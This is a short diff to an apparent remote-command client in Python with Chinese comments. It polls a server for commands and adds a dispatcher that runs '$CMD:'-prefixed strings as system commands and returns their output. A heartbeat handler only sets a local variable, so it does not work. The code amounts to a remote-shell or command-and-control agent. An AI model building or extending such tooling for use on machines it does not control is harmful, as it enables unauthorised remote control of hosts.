@@ -55,15 +55,16 @@ def poll_command():
         log(f"轮询命令异常: {e}", "ERROR")
         return None
 
-def execute_command(cmd_str):
+
+
+
+
+def sys_command(cmd_str):
     """
     执行系统命令，返回 (head, body)
     head: 简略状态 (例如 "OK" 或 "ERROR")
     body: 命令的标准输出 + 标准错误
     """
-    if not cmd_str or cmd_str.startswith("$"):
-        # 如果是特殊标记（如 $SIGNUP, $NOT_ME），不执行
-        return None, None
 
     log(f"执行命令: {cmd_str}")
     try:
@@ -86,6 +87,27 @@ def execute_command(cmd_str):
     except Exception as e:
         log(f"执行命令异常: {e}", "ERROR")
         return f"'{CLIENT_ID}' failed in running command", str(e)
+
+
+def execute_command(cmd_str):
+
+    log(f"处理命令: {cmd_str}")
+    cmds=cmd_str.split(":")
+    signal=cmds[0]
+    command=":".join(cmds[1:])
+    try:
+        if signal=="$CMD":
+            return sys_command(command)
+        elif signal=="$HBTIME":
+            POLL_INTERVAL = str(command)
+            return f"'{CLIENT_ID}' changed heartbeat time",command
+        else:
+            return f"'{CLIENT_ID}' received illegal command",command
+    except Exception as e:
+        return f"'{CLIENT_ID}' error execusing command",e
+
+
+
 
 def submit_response(cmd_head, cmd_body):
     """向 /response 提交命令执行结果 (独立请求)"""
